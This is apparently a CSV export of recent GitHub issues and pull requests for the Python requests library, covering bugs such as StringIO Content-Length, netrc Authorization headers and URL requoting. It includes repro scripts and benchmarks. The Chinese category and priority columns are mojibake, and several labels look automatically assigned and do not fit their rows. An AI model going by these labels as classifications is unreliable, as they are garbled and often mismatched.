    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.7""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.10.17""
  },
  ""platform"": {
    ""release"": ""5.15.0-113-generic"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""300000f0""
  },
  ""urllib3"": {
    ""version"": ""2.4.0""
  },
  ""using_charset_normalizer"": false,
  ""using_pyopenssl"": false
}
```","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",é«˜,https://github.com/psf/requests/issues/6931
2980380899,Not able to connect anymore,"Since today it ain't able to connect. Yesterday I see it still worked
Tried to restart and rebuild, but want resolving. Login via the normal app of the solar panels works fine and there is data available of today



See logging

Getting mqtt data...
[18:43:24] INFO: null
[18:43:24] INFO: {""supervisor"":""2025.03.4"",""homeassistant"":""2025.4.1"",""hassos"":""15.1"",""docker"":""28.0.4"",""hostname"":""homeassistant"",""operating_system"":""Home Assistant OS 15.1"",""features"":[""reboot"",""shutdown"",""services"",""network"",""hostname"",""timedate"",""os_agent"",""haos"",""resolved"",""journal"",""disk"",""mount""],""machine"":""raspberrypi4-64"",""arch"":""aarch64"",""state"":""running"",""supported_arch"":[""aarch64"",""armv7"",""armhf""],""supported"":true,""channel"":""stable"",""logging"":""info"",""timezone"":""Europe/Amsterdam""}
[18:43:24] INFO: {""supervisor"":""2025.03.4"",""homeassistant"":""2025.4.1"",""hassos"":""15.1"",""docker"":""28.0.4"",""hostname"":""homeassistant"",""operating_system"":""Home Assistant OS 15.1"",""features"":[""reboot"",""shutdown"",""services"",""network"",""hostname"",""timedate"",""os_agent"",""haos"",""resolved"",""journal"",""disk"",""mount""],""machine"":""raspberrypi4-64"",""arch"":""aarch64"",""state"":""running"",""supported_arch"":[""aarch64"",""armv7"",""armhf""],""supported"":true,""channel"":""stable"",""logging"":""info"",""timezone"":""Europe/Amsterdam""}
dmslabs - Home Assistant HoyMiles Solar Data Gateway Add-on
2025-04-08 18:43:25,419 - HoymilesAdd-on - INFO - ********** dmslabs&Cosik Hoymiles Gateway  v.1.4.1
2025-04-08 18:43:25,419 - HoymilesAdd-on - INFO - Starting up... 2025-04-08 18:43:25
2025-04-08 18:43:25,420 - HoymilesAdd-on - INFO - Using Internal MQTT Server: core-mosquitto
2025-04-08 18:43:25,421 - HoymilesAdd-on - INFO - Using Internal MQTT User: addons
2025-04-08 18:43:25,421 - HoymilesAdd-on.mqttapi.Mqtt - INFO - mqtt.Client 974895be-1498-11f0-9f1e-d83add5f0236
2025-04-08 18:43:25,421 - HoymilesAdd-on.mqttapi.Mqtt - INFO - Starting MQTT core-mosquitto
2025-04-08 18:43:25,740 - HoymilesAdd-on.mqttapi.Mqtt - INFO - MQTT connected with result code 0
2025-04-08 18:43:25,740 - HoymilesAdd-on.mqttapi.Mqtt - INFO - Connected to core-mosquitto
2025-04-08 18:43:26,426 - HoymilesAdd-on.hoymilesapi.Hoymiles - INFO - Loading: https://global.hoymiles.com/platform/api/gateway/iam/auth_login
2025-04-08 18:43:27,489 - HoymilesAdd-on.hoymilesapi.Hoymiles - ERROR - Access error: https://global.hoymiles.com/platform/api/gateway/iam/auth_login
2025-04-08 18:43:27,490 - HoymilesAdd-on.hoymilesapi.Hoymiles - ERROR - Status code: 404Not Found
2025-04-08 18:43:27,491 - HoymilesAdd-on.hoymilesapi.Hoymiles - ERROR - Wrong user/password 404 Not Found
2025-04-08 18:43:27,492 - HoymilesAdd-on.hoymilesapi.Hoymiles - ERROR - I can't get access token","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6930
2979668265,Add docstring to to_key_val_list for better docs,"Added a docstring to `to_key_val_list` in `utils.py` to clarify its purpose for users handling headers/params.
- GSoC prep contribution for DSOMM!","è´¦å·é—®é¢˜, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6929
2973457928,Python 3.13: an unexpected `Authorization` header because of NETRC file,"When sending POST request using Python 3.13 with `requests` v2.32.3 there appear an unexpected `Authorization` header.
This is not the case with Python 3.10 with the same version of `requests` lib.

## Expected Result

POST request does not get updated with an unexpected `Authorization` header.

## Actual Result

Python 3.13
```shell
> ~/tmp/zzz.py 2>&1 | egrep -m 1 ""^send: ""
send: b'POST /oauth2/v1/device/authorize HTTP/1.1\r\nHost: okta.oktapreview.com\r\nUser-Agent: gimme-aws-creds 2.8.2;linux;3.13.2\r\nAccept-Encoding: gzip, deflate\r\nAccept: application/json\r\nConnection: keep-alive\r\nContent-Length: 52\r\nContent-Type: application/x-www-form-urlencoded\r\nAuthorization: Basic Og==\r\n\r\n'
```
Python 3.10
```shell
> ~/tmp/zzz.py 2>&1 | egrep -m 1 ""^send: ""
send: b'POST /oauth2/v1/device/authorize HTTP/1.1\r\nHost: okta.oktapreview.com\r\nUser-Agent: gimme-aws-creds 2.8.2;linux;3.13.2\r\nAccept-Encoding: gzip, deflate, br\r\nAccept: application/json\r\nConnection: keep-alive\r\nContent-Length: 52\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n'
```

## Reproduction Steps

```python
import requests
import logging

try:
    import http.client as http_client
except ImportError:
    # Python 2
    import httplib as http_client
http_client.HTTPConnection.debuglevel = 1

logging.basicConfig()
logging.getLogger().setLevel(logging.DEBUG)
requests_log = logging.getLogger(""requests.packages.urllib3"")
requests_log.setLevel(logging.DEBUG)
requests_log.propagate = True

data = {
    ""client_id"": ""<client_id>"",
    ""scope"": ""openid okta.apps.sso""
}
url = ""https://okta.oktapreview.com/oauth2/v1/device/authorize""
headers = {'User-Agent': 'gimme-aws-creds 2.8.2;linux;3.13.2', 'Accept': 'application/json'}

response = requests.post(url, data=data, headers=headers, verify=True)

print(response.text)
```

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.1""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.13.2""
  },
  ""platform"": {
    ""release"": ""6.8.0-52-generic"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30400010""
  },
  ""urllib3"": {
    ""version"": ""2.3.0""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}
```

Ref: https://github.com/Nike-Inc/gimme-aws-creds/issues/485","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥",ä¸­,https://github.com/psf/requests/issues/6928
2962437044,Use parse_url() from urllib3.util instead of urlparse,"urllib.parse.urlparse() does not handle link local ipv6 addresses with port numbers. Use parse_url() from urllib3 instead.

Fixes: c0813a2d910 (""Use TLS settings in selecting connection pool"")
Fixes: https://github.com/psf/requests/issues/6735
Co-authored-by: Amy Chen <xiachen@redhat.com>
Signed-off-by: Ani Sinha <anisinha@redhat.com>
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥",ä¸­,https://github.com/psf/requests/pull/6927
2961112330,Drop pypy 3.9 and add pypy 3.11 support,This PR drops support for Pypy 3.9 and adds it for Pypy 3.11 on Linux and macOS. The Windows test runner for Pypy 3.11 is failing because it's unable to install Openssl-sys with the rust bindings for Cryptography. It looks like this may have been an oversight according to https://github.com/pyca/cryptography/issues/12592 and will be released in an upcoming release.,Bugåé¦ˆ,ä¸­,https://github.com/psf/requests/pull/6926
2960985259,Bump actions/setup-python from 5.4.0 to 5.5.0,"Bumps [actions/setup-python](https://github.com/actions/setup-python) from 5.4.0 to 5.5.0.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/actions/setup-python/releases"">actions/setup-python's releases</a>.</em></p>
<blockquote>
<h2>v5.5.0</h2>
<h2>What's Changed</h2>
<h3>Enhancements:</h3>
<ul>
<li>Support free threaded Python versions like '3.13t' by <a href=""https://github.com/colesbury""><code>@â€‹colesbury</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/973"">actions/setup-python#973</a></li>
<li>Enhance Workflows: Include ubuntu-arm runners, Add e2e Testing for free threaded and Upgrade <code>@â€‹action/cache</code> from 4.0.0 to 4.0.3 by <a href=""https://github.com/priya-kinthali""><code>@â€‹priya-kinthali</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/1056"">actions/setup-python#1056</a></li>
<li>Add support for .tool-versions file in setup-python by <a href=""https://github.com/mahabaleshwars""><code>@â€‹mahabaleshwars</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/1043"">actions/setup-python#1043</a></li>
</ul>
<h3>Bug fixes:</h3>
<ul>
<li>Fix architecture for pypy on Linux ARM64 by <a href=""https://github.com/mayeut""><code>@â€‹mayeut</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/1011"">actions/setup-python#1011</a>
This update maps arm64 to aarch64 for Linux ARM64 PyPy installations.</li>
</ul>
<h3>Dependency updates:</h3>
<ul>
<li>Upgrade <code>@â€‹vercel/ncc</code> from 0.38.1 to 0.38.3 by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/1016"">actions/setup-python#1016</a></li>
<li>Upgrade <code>@â€‹actions/glob</code> from 0.4.0 to 0.5.0 by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/1015"">actions/setup-python#1015</a></li>
</ul>
<h2>New Contributors</h2>
<ul>
<li><a href=""https://github.com/colesbury""><code>@â€‹colesbury</code></a> made their first contribution in <a href=""https://redirect.github.com/actions/setup-python/pull/973"">actions/setup-python#973</a></li>
<li><a href=""https://github.com/mahabaleshwars""><code>@â€‹mahabaleshwars</code></a> made their first contribution in <a href=""https://redirect.github.com/actions/setup-python/pull/1043"">actions/setup-python#1043</a></li>
</ul>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/actions/setup-python/compare/v5...v5.5.0"">https://github.com/actions/setup-python/compare/v5...v5.5.0</a></p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/actions/setup-python/commit/8d9ed9ac5c53483de85588cdf95a591a75ab9f55""><code>8d9ed9a</code></a> Add e2e Testing for free threaded and Bump <code>@â€‹action/cache</code> from 4.0.0 to 4.0.3 ...</li>
<li><a href=""https://github.com/actions/setup-python/commit/19e4675e06535f6b54e894da5c1f044400bb4996""><code>19e4675</code></a> Add support for .tool-versions file in setup-python (<a href=""https://redirect.github.com/actions/setup-python/issues/1043"">#1043</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/6fd11e170a18f6ae448d1080a4a63cc987aed84c""><code>6fd11e1</code></a> Bump <code>@â€‹actions/glob</code> from 0.4.0 to 0.5.0 (<a href=""https://redirect.github.com/actions/setup-python/issues/1015"">#1015</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/9e62be81b28222addecf85e47571213eb7680449""><code>9e62be8</code></a> Support free threaded Python versions like '3.13t' (<a href=""https://redirect.github.com/actions/setup-python/issues/973"">#973</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/6ca8e8598faa206f7140a65ba31b899bebe16f58""><code>6ca8e85</code></a> Bump <code>@â€‹vercel/ncc</code> from 0.38.1 to 0.38.3 (<a href=""https://redirect.github.com/actions/setup-python/issues/1016"">#1016</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/8039c45ed9a312fba91f3399cd0605ba2ebfe93c""><code>8039c45</code></a> fix: install PyPy on Linux ARM64 (<a href=""https://redirect.github.com/actions/setup-python/issues/1011"">#1011</a>)</li>
<li>See full diff in <a href=""https://github.com/actions/setup-python/compare/42375524e23c412d93fb67b49958b491fce71c38...8d9ed9ac5c53483de85588cdf95a591a75ab9f55"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=actions/setup-python&package-manager=github_actions&previous-version=5.4.0&new-version=5.5.0)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot show <dependency name> ignore conditions` will show all of the ignore conditions of the specified dependency
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)


</details>","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6925
2958035697,Add key usage extension to test ca.crt,"When setting `VERIFY_X509_STRICT` in urllib3 (see https://github.com/urllib3/urllib3/pull/3577) the requests tests fail because the key usage extension is missing in ca.crt:
```
% cd tests/certs/valid/server
% openssl verify -CAfile ../ca/ca.crt -x509_strict server.pem
C=US, O=Python Software Foundation, OU=python-requests, CN=Self-Signed Root CA
error 92 at 1 depth lookup: CA cert does not include key usage extension
error server.pem: verification failed
```
This PR fixes the issue.","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",ä¸­,https://github.com/psf/requests/pull/6924
2957522803,Don't normalise or double-escape urls,"### Summary

I recently hit a url that I could not retrieve with `requests`, but that can be retrieved using another client executing an identical http request.  Specifically: When a url contains a percent-escaped tilde `~` (i.e. `%7E`), `requests` behaves differently than any other http client that I tried and performs unneeded normalization.  In addition to that, it double encodes invalid urls, which again differs from any other client.

### Testing

To illustrate this, I wrote some test code that records the paths that a variety of clients request.  In addition to `requests`, I tested the following http client libraries / browsers across `python`, `java`, `go`, `C`, `js` and `rust`. All http clients that I tested behave the same and use the target as-is, except `requests`. `requests` normalizes `%7E` to `~`: 

    - Go-http-client/1.1
    - Java-http-client/21.0.5
    - Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
    - Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
    - Python-urllib/3.13
    - axios/1.8.4
    - curl/8.12.1
    - go-resty/3.0.0-beta.1 (https://resty.dev)
    - got (https://github.com/sindresorhus/got)
    - node
    - python-httpx/0.28.1
    - python-urllib3/2.3.0
    - requests-patched (see suggestion below)
    - reqwest

The test code (server + automation to run all listed clients against it) is available here: https://github.com/moben/bugs/tree/aa8e4eb928e8189f5d863748d6d06e980d4f8a87/requests_http_location

The test server redirects `/v` to `f""/v/%7E/-._~/{urllib.parse.quote(string.printable)}""`, i.e. `/v/%7E/-._~/0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%21%22%23%24%25%26%27%28%29%2A%2B%2C-./%3A%3B%3C%3D%3E%3F%40%5B%5C%5D%5E_%60%7B%7C%7D~%20%09%0A%0D%0B%0C`

All clients listed above use this verbatim, but `requests` normalizes it to `/v/~/....`.  Note: I originally thought this was specific to redirects, but it also happens when passing the url directly to `requests.get`.

### Root Cause & Proposed Fix

You might object that some of the tested clients are built on each other so they should be one data point.  But on the other hand, note that `requests` behaves differently from `urllib3` here.

The reason for `requests` differing from `urllib3` can be found in the history of the current normalization: The normalization (`requote_uri`) was added in 2013 in https://github.com/psf/requests/pull/1361 to resolve https://github.com/psf/requests/issues/1360.  But in 2019 handling of invalid urls was also solved in `urllib3` in https://github.com/urllib3/urllib3/pull/1647.  Not only does the `urllib3` implementation more closely match what all other clients are doing and does not change valid urls.  It also means that `requests` is double-encoding invalid uris.  If the url is invalid we probably can't expect much but the path that `requests` uses has no chance to decode to the same that any other client uses, even to the most lenient server.

I believe the best way to fix this is to simply drop the ""requoting"" that `requests` is doing and rely on `urllib3`'s implementation here: https://github.com/urllib3/urllib3/blob/main/src/urllib3/util/url.py#L227
This gives the same behavior as (almost, see below) all other clients for valid urls and avoids the double encoding for invalid ones.  In my test code, this is `requests-patched`.


### Further notes

I also tested weird and invalid url edge cases:

- When percent-encoding all characters, including alphanumeric and `-._~`, one other client differs from the rest. `chrome` decodes specifically `.`.  I believe this to be a rather esotheric test case because unlike `~`, which became unreserved in RFC 3986 compared to RFC 1738, these characters were always unreserved.
- For invalid uris (broken percent encoding, unencoded characters) behavior differs wildly.  But all clients except `requests` use a url that decodes to the same string via e.g. `urllib.parse.unquote`.  (`requests` differs because of the double encoding)

It can of course be argued that the server should treat `%7E` and `~` in my original test case the same.  But in the interest of interoperability I believe it still makes sense to align with what every other client is doing and also drop the double encoding.
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",ä¸­,https://github.com/psf/requests/pull/6923
2951389967,"`proxies=None` seem to be ""overridden"" by env vars even on when specifed on the individual requests","Hey.

According to the [documentaion](https://requests.readthedocs.io/en/latest/user/advanced/#proxies):
> Setting `session.proxies` may behave differently than expected. Values provided will be overwritten by environmental proxies (those returned by [urllib.request.getproxies](https://docs.python.org/3/library/urllib.request.html#urllib.request.getproxies)). To ensure the use of proxies in the presence of environmental proxies, explicitly specify the `proxies` argument on all individual requests as initially explained above.

any `proxies=` specified on the requests (I assume on `requests.get()`, etc.  should **not** be overridden by env vars.

This does however not work for the case when one explicitly specifies no proxy, simply because there is no real notion for that and `None` is merely used as a default for ""nothing specified"".

So I think this should at least be documented above, and it would be nice if there was a way to actually say 'don't use a proxy'.

Perhaps by using `proxies=False` or so?

Cheers,
Chris.","åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6922
2944087152,Implement Happy Eyeballs?,"Requests is not accepting feature requests at this time.

The above said, would implementing Happy Eyeballs be difficult?",åŠŸèƒ½å»ºè®®,ä¸­,https://github.com/psf/requests/issues/6921
2942771747,Fix invalid setuptools config in `setup.cfg` (will fail on `setuptools>78.0.0`),"In version 78 of setuptools, the invalid configuration in `setup.cfg` will start to fail (there has been a deprecation warning since 3 Mar 2021).

I also noticed that most of the [information provided to `setup.cfg`](https://github.com/psf/requests/blob/v2.32.3/setup.cfg#L3-L10) is [repeated](https://github.com/psf/requests/blob/v2.32.3/setup.py#L61-L66) in [`setup.py`](https://github.com/psf/requests/blob/v2.32.3/setup.py#L124-L127), so I removed the duplicated copies in `setup.cfg`, because the project seems to be primarily using `setup.py`.

Alternatively, I can also try to migrate the static configs to `pyproject.toml` if desired (please let me know).","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",é«˜,https://github.com/psf/requests/pull/6920
2940563042,Improvements for _parse_content_type_header making it more readable aâ€¦,"â€¦nd more robust

## Why this is better at scale:
Avoids full split if no semicolon (fast path).
Does only one split on =, minimizes string churn.
Avoids multiple .strip() calls â€” chains them efficiently.
Fewer allocations and GC impact.

## Benchmarked using

```
import timeit

# Original version of the function
def parse_content_type_original(header):
    tokens = header.split("";"")
    content_type, params = tokens[0].strip(), tokens[1:]
    params_dict = {}
    items_to_strip = ""\""' ""
    for param in params:
        param = param.strip()
        if param:
            key, value = param, True
            index_of_equals = param.find(""="")
            if index_of_equals != -1:
                key = param[:index_of_equals].strip(items_to_strip)
                value = param[index_of_equals + 1:].strip(items_to_strip)
            params_dict[key.lower()] = value
    return content_type, params_dict
# Optimized version
def parse_content_type_optimized(header):
    semicolon_index = header.find("";"")
    if semicolon_index == -1:
        return header.strip(), {}
    content_type = header[:semicolon_index].strip()
    params_dict = {}
    rest = header[semicolon_index + 1:]
    for param in rest.split("";""):
        param = param.strip()
        if not param:
            continue
        if ""="" in param:
            key, value = param.split(""="", 1)
            key = key.strip(""\""' "").lower()
            value = value.strip(""\""' "")
        else:
            key, value = param.strip(""\""' "").lower(), True
        params_dict[key] = value
    return content_type, params_dict
# Sample header for testing
header_sample = ""application/json; charset=UTF-8; boundary='abc'; format=pretty""
# Benchmark setup
setup_code = ""from __main__ import parse_content_type_original, parse_content_type_optimized, header_sample""
# Run benchmarks
original_time = timeit.timeit(""parse_content_type_original(header_sample)"", setup=setup_code, number=1_000_000)
optimized_time = timeit.timeit(""parse_content_type_optimized(header_sample)"", setup=setup_code, number=1_000_000)

print(original_time, optimized_time)
```
Output: 
```
Current                   NEW
1.9832534999586642 1.8716010999633
```",å…¶ä»–,ä¸­,https://github.com/psf/requests/pull/6919
2940285406,Fix incorrect Content-Length for StringIO with multi-byte characters,"This PR fixes issue #6917 where `io.StringIO` objects containing multi-byte characters report incorrect Content-Length headers.

## The issue
When using `io.StringIO` objects with multi-byte characters (like emoji), the Content-Length header is incorrectly set to the character count instead of the byte count. This happens because `StringIO.tell()` reports character positions, not byte positions.

For example, the emoji ""ğŸ’©"" is 1 character but 4 bytes in UTF-8. With the current implementation, the Content-Length header incorrectly shows 1 instead of 4.

## The fix
The solution ensures that `io.StringIO` objects correctly report their UTF-8 encoded byte length by:
1. Detecting when the object is an `io.StringIO` instance
2. Reading the entire content and calculating its UTF-8 encoded length
3. Restoring the original position to maintain the object's state

I've added a test case that reproduces the issue and verifies the fix works with emoji characters.","Bugåé¦ˆ, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6918
2937693990,Incorrect Content-Length header with StringIO body,"When requests is used with an `io.StringIO` as the `data` type, and the body contains characters whose utf-8 encoding is multiple bytes, the Content-Length header is set incorrectly.

Looking at the [implementation of `super_len`](https://github.com/psf/requests/blob/1764cc938efc3cc9720188dfa6c3852c45211aa0/src/requests/utils.py#L189-L199), it appears that `io.StringIO` has its length measured using `seek` and `tell`.
It has been implemented that way since June 2016 (af7729f64a97ab35e83a1a7971781e69d124d99e).

It looks like this was fixed for `str` inputs in #6586 in 2023 but was never fixed for io.StringIO

I am happy to send a PR if the implementation is straightforward.
Off the top of my head I don't know how to count the bytes in a utf-8 encoded StringIO without copying, and previous PRs have tried to avoid a copy in `super_len`


## Expected Result

Content-Length should match the number of bytes sent when using io.StringIO

## Actual Result

Content-Length is the length of the string, not the bytes sent.

## Reproduction Steps

Run the following script, which shows the problem in detail

```python
import io
import requests
from urllib3.connection import HTTPConnection
from requests.utils import super_len
from requests.models import PreparedRequest

# A string that is 1 character but 4 bytes in UTF-8.
# requests will always send 4 bytes, but the Content-Length header depends on the type passed as `data`.
value = ""ğŸ’©""

body_types = [{
  ""name"": ""str"",
  ""value"": value,
}, {
  ""name"": ""bytes"",
  ""value"": value.encode(""utf-8""),
}, {
  ""name"": ""io.BytesIO"",
  ""value"": io.BytesIO(value.encode(""utf-8"")),
},
{
  ""name"": ""io.StringIO"",
  ""value"": io.StringIO(value),
}]

print(""## Super Len"")
for body_type in body_types:
  print(""Body Type:"", body_type[""name""])
  print(""Super Len:"", super_len(body_type[""value""]))
  p = PreparedRequest()
  p.prepare(
      method=""POST"",
      url=""http://example.com"",
      data=body_type[""value""],
  )
  print(""Prepared Headers:"", p.headers)

# Monkey patch to print the data sent.
old_send = HTTPConnection.send
def new_send(self, data):
  print(""Sending Data:"", data)
  old_send(self, data)
HTTPConnection.send = new_send


print(""## Requests"")
for body_type in body_types:
  r = requests.post(
    ""http://example.com"",
    data=body_type[""value""],
  )
```

Here is my output:
```
## Super Len
Body Type: str
Super Len: 4
Prepared Headers: {'Content-Length': '4'}
Body Type: bytes
Super Len: 4
Prepared Headers: {'Content-Length': '4'}
Body Type: io.BytesIO
Super Len: 4
Prepared Headers: {'Content-Length': '4'}
Body Type: io.StringIO
Super Len: 1
Prepared Headers: {'Content-Length': '1'}
## Requests
Sending Data: b'POST / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: python-requests/2.32.3\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Length: 4\r\n\r\n'
Sending Data: b'\xf0\x9f\x92\xa9'
Sending Data: b'POST / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: python-requests/2.32.3\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Length: 4\r\n\r\n'
Sending Data: b'\xf0\x9f\x92\xa9'
Sending Data: b'POST / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: python-requests/2.32.3\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Length: 4\r\n\r\n'
Sending Data: b'\xf0\x9f\x92\xa9'
Sending Data: b'POST / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: python-requests/2.32.3\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Length: 1\r\n\r\n'
Sending Data: b'\xf0\x9f\x92\xa9'
```

Notice that the request is always the same, except that the `Content-Length` header is `1` instead of `4` when io.StringIO is used.



## System Information

```json
{
  ""chardet"": {
    ""version"": ""5.2.0""
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.1""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.12.9""
  },
  ""platform"": {
    ""release"": ""22.6.0"",
    ""system"": ""Darwin""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30400010""
  },
  ""urllib3"": {
    ""version"": ""2.3.0""
  },
  ""using_charset_normalizer"": false,
  ""using_pyopenssl"": false
}
```
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",é«˜,https://github.com/psf/requests/issues/6917
2930369716,Use a more intuitive PySocks version,"I accidentally found this in the pip log: `Collecting PySocks!=1.5.7,>=1.5.6 (from requests[socks]`

This seems odd; I'm not sure if it's worth changing to a more intuitive version **at the cost of removing 1.5.6 from compatible version list**.

`!=1.5.7` was introduced in https://github.com/psf/requests/pull/3552
pysocks release history: https://pypi.org/project/PySocks/#history",åŠŸèƒ½å»ºè®®,ä¸­,https://github.com/psf/requests/pull/6916
2928848301,HTTPDigestAuth add optional Realm parameter to the authentication,"I noticed that urllib allows to specify the realm of a HTTPDigestAuth but the requests library doesn't allow it. Is it possible to add it on the standard requests library?

There are many devices that specify the realm where it is not the url domain name.
It is possible to do it with the urllib library that requests uses underneath.

Example (A Hickvision network camera):
==========================
#0000: GET /ISAPI/notification/alertStream HTTP/1.1
#002e: Host: 192.168.10.64
#0043: Authorization: Digest username=""admin"",realm=""iDS-TCM403-BI"",non
#0083: ce=""4e45497a4d4459774e45553659544d334d6d55344d7a6b3d"",uri=""/ISAP
#00c3: I/notification/alertStream"",cnonce=""c9bc93c864ef47d8e6879678ad85
#0103: 511c"",nc=00000001,algorithm=MD5,response=""ffeaecca50dc4b23a7bc68
#0143: 6c0200c339"",qop=""auth""
#015b: User-Agent: curl/8.10.1
#0174: Accept: */*
#0181: Connection: keep-alive

Where it would be a good idea to implement it:
====================================
from requests.auth import HTTPDigestAuth
At the auth.py file

It now only accepts two parameters:
https://requests.readthedocs.io/en/latest/user/authentication/

Use example with urllib without the requests library:
=======================================
import urllib
import urllib.request

# Examples:
Username=""oneusername""
Password=""onepassword""
Realm =""iDS-TCM403-BI""

password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
password_mgr.add_password(Realm, ""http://192.168.10.64/"", Username, Password)

handler = urllib.request.HTTPDigestAuthHandler(password_mgr)
opener = urllib.request.build_opener(handler)
urllib.request.install_opener(opener)

response = urllib.request.urlopen(URL)

=========================================","åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",é«˜,https://github.com/psf/requests/issues/6915
2926001899,The docs say raise_for_status() returns the Response when status is 200. It does not do that.,"=== Summary ===

`Response.raise_for_status()` should return the `Response` object when the status_code is 200, as specified by the docs: https://3.python-requests.org/user/quickstart/#response-status-codes

=== What you expected ===

`Response.raise_for_status()` returns the Response object when status code is 200.

=== What happened instead ===

`Response.raise_for_status()` does not have a return statement anywhere, so on a 200 it just returns None.

```python
import requests

response = requests.get('https://pypi.org')
print(response.raise_for_status())
```
Assuming pypi.org's homepage doesn't error, this should print a `Response` object. Instead, it always prints `None`.

=== System Information ===

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.1""
  },
  ""cryptography"": {
    ""version"": ""43.0.3""
  },
  ""idna"": {
